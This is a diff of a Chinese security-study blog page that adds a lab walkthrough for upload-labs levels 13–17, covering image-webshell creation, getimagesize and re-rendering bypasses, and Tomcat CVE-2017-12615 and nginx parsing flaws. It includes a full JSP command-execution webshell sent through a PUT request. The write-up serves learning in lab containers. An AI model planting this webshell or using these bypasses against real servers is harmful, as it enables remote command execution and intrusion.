@@ -443,12 +443,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -466,14 +479,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    6 分
                 </div>
                 
 
@@ -493,7 +506,187 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="WEB漏洞-文件上传之内容逻辑数组绕过"><a href="#WEB漏洞-文件上传之内容逻辑数组绕过" class="headerlink" title="WEB漏洞-文件上传之内容逻辑数组绕过"></a><font size="6"><strong>WEB漏洞-文件上传之内容逻辑数组绕过</strong></font></h2><span id="more"></span>
+<p><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/1.png"></p>
+<pre class=" language-bash"><code class="language-bash">copy 1.png /b + shell.php /a webshell.jpg
+
+文件头检测
+图像文件信息判断
+逻辑安全<span class="token operator">=</span>二次渲染
+逻辑安全-条件竞争目录命名-x.php/.
+脚本函数漏洞-CVE-2015-2348
+数组接受+目录命名
+</code></pre>
+<p>copy 1.png &#x2F;b + shell.php &#x2F;a webshell.jpg意思是将shell.php中的代码追加到1.png中并重新生成一个叫webshell.php的代码。</p>
+<h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a><font size="5"><strong>第十三关</strong></font></h3><p>用上面的代码制作成图片马然后正常上传，获取到图片的地址。然后打开文件包含漏洞页面<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/2.png"></p>
+<p>将刚才上传的图片作为参数发送给服务器。然后获取到webshell<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/3.png"></p>
+<p>也可以用蚁剑这种工具拿下webshell<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/4.png"></p>
+<h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a><font size="5"><strong>第十四关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> isImage<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>
+    if<span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        <span class="token variable">$info</span> <span class="token operator">=</span> getimagesize<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$ext</span> <span class="token operator">=</span> image_type_to_extension<span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        if<span class="token punctuation">(</span>stripos<span class="token punctuation">(</span><span class="token variable">$types</span>,<span class="token variable">$ext</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+
+<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+<span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>
+if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span> <span class="token operator">=</span> isImage<span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    if<span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>
+        <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">"/"</span>.rand<span class="token punctuation">(</span>10, 99<span class="token punctuation">)</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.<span class="token variable">$res</span><span class="token punctuation">;</span>
+        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>,<span class="token variable">$img_path</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+</code></pre>
+<p>getimagesize代码的核心就是使用这个函数这个函数会对文件头进行验证，比如GIF的文件头问GIF89apng的文件头为塒NG，所以此处正常上传一个图片马将后缀改名为PHP即可<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/5.png"><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/6.png"></p>
+<h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a><font size="5"><strong>第十五关</strong></font></h3><p>和上面的一关基本是一样的只需要正常的上传然后结合文件包含漏洞利用。</p>
+<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a><font size="5"><strong>第十六关</strong></font></h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46436640/article/details/107809772">https://blog.csdn.net/m0_46436640/article/details/107809772</a><br>这一关的难度相对来说比较大，因为文件的验证比较复杂。</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+<span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$tmpname</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$target_path</span><span class="token operator">=</span>UPLOAD_PATH.basename<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    // 获得上传文件的扩展名
+    <span class="token variable">$fileext</span><span class="token operator">=</span> substr<span class="token punctuation">(</span>strrchr<span class="token punctuation">(</span><span class="token variable">$filename</span>,<span class="token string">"."</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    //判断文件后缀与类型，合法才进行上传操作
+    if<span class="token punctuation">((</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string">"image/jpeg"</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$tmpname</span>,<span class="token variable">$target_path</span><span class="token punctuation">))</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            //使用上传的图片生成新的图片
+            <span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefromjpeg<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            if<span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> false<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是jpg格式的图片！"</span><span class="token punctuation">;</span>
+                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>
+                //给新图片指定文件名
+                srand<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
+                <span class="token variable">$newfilename</span> <span class="token operator">=</span> strval<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">))</span>.<span class="token string">".jpg"</span><span class="token punctuation">;</span>
+                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                imagejpeg<span class="token punctuation">(</span><span class="token variable">$im</span>,<span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else if(($fileext == "png") &amp;&amp; ($filetype=="image/png"))&amp;#123;</span>
+        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$tmpname</span>,<span class="token variable">$target_path</span><span class="token punctuation">))</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            //使用上传的图片生成新的图片
+            <span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefrompng<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            if<span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> false<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>
+                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>
+                 //给新图片指定文件名
+                srand<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
+                <span class="token variable">$newfilename</span> <span class="token operator">=</span> strval<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">))</span>.<span class="token string">".png"</span><span class="token punctuation">;</span>
+                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                imagepng<span class="token punctuation">(</span><span class="token variable">$im</span>,<span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>               
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif"))&amp;#123;</span>
+        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$tmpname</span>,<span class="token variable">$target_path</span><span class="token punctuation">))</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            //使用上传的图片生成新的图片
+            <span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefromgif<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            if<span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> false<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是gif格式的图片！"</span><span class="token punctuation">;</span>
+                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>
+                //给新图片指定文件名
+                srand<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
+                <span class="token variable">$newfilename</span> <span class="token operator">=</span> strval<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">))</span>.<span class="token string">".gif"</span><span class="token punctuation">;</span>
+                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                imagegif<span class="token punctuation">(</span><span class="token variable">$im</span>,<span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+</code></pre>
+<p>先上传一张图片马然后下载，将下载的图片马和原先的图片进行对比，发现没有被渲染的位置插入PHP代码最后在上传，再下载观察PHP代码是否被渲染。<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/7.png"><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/8.png"><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/9.png"></p>
+<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a><font size="5"><strong>第十七关</strong></font></h3><h3 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a><font size="5"><strong>中间件解析漏洞</strong></font></h3><p><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/10.png"></p>
+<h4 id="1-tomcat文件解析漏洞"><a href="#1-tomcat文件解析漏洞" class="headerlink" title="1.tomcat文件解析漏洞"></a><font size="4"><strong>1.tomcat文件解析漏洞</strong></font></h4><p>CVE-2017-12615<br>环境搭建<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/">https://vulhub.org/#/environments/tomcat/CVE-2017-12615/</a></p>
+<pre class=" language-bash"><code class="language-bash">jiang@ubuntu:/opt/vulhub/vulhub-master/tomcat/CVE-2017-12615$ docker-compose up -d
+</code></pre>
+<p><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/11.png"></p>
+<p>burp修改数据包</p>
+<pre class=" language-bash"><code class="language-bash">PUT /1.jsp/ HTTP/1.1
+Host: 10.1.1.7:8080
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE 9.0<span class="token punctuation">;</span> Windows NT 6.1<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> Trident/5.0<span class="token punctuation">)</span>
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 750
+
+
+<span class="token operator">&lt;</span>%@ page language<span class="token operator">=</span><span class="token string">"java"</span> import<span class="token operator">=</span><span class="token string">"java.util.*,java.io.*"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span>%<span class="token operator">></span>
+     
+    <span class="token operator">&lt;</span>%<span class="token operator">!</span>public static String excuteCmd<span class="token punctuation">(</span>String c<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+     
+    StringBuilder line <span class="token operator">=</span> new StringBuilder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     
+    try <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));</span>
+     
+    String temp <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token variable"><span class="token punctuation">((</span>temp <span class="token operator">=</span> buf.readLine<span class="token punctuation">(</span><span class="token punctuation">))</span></span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+     
+    line.append<span class="token punctuation">(</span>temp+<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;buf.close();&amp;#125; catch (Exception e) &amp;#123;</span>
+     
+    line.append<span class="token punctuation">(</span>e.getMessage<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;return line.toString();&amp;#125;%>&lt;%if("023".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd")))&amp;#123;</span>
+     
+    out.println<span class="token punctuation">(</span><span class="token string">"&lt;pre>"</span>+excuteCmd<span class="token punctuation">(</span>request.getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">))</span>+<span class="token string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;out.println(":-)");&amp;#125;%></span>
+</code></pre>
+<p>访问<a target="_blank" rel="noopener" href="http://10.1.1.7:8080/1.jsp?&pwd=023&cmd=id">http://10.1.1.7:8080/1.jsp?&amp;pwd=023&amp;cmd=id</a><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/12.png"><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/13.png"></p>
+<h4 id="2-nginx解析漏洞"><a href="#2-nginx解析漏洞" class="headerlink" title="2.nginx解析漏洞"></a><font size="4"><strong>2.nginx解析漏洞</strong></font></h4><p>环境搭建:<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</a></p>
+<pre class=" language-bash"><code class="language-bash">jiang@ubuntu:/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerability$ <span class="token function">pwd</span>
+/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerability
+jiang@ubuntu:/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerability$ docker-compose up -d
+</code></pre>
+<p><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/14.png"></p>
+<p>然后在URL后面添加&#x2F;xx.php 文件名随便<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/15.png"></p>
+
                 
             </div>
             <hr/>
@@ -556,7 +749,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -777,7 +974,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            WEB漏洞-文件上传之基础及过滤方式F
+                            WEB漏洞-文件上传之后端黑白名单绕过
                         
                     </div>
                     <div class="publish-info">
@@ -1040,7 +1237,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">33.7k</span>&nbsp;字
+                class="white-color">37.6k</span>&nbsp;字
             
             
             
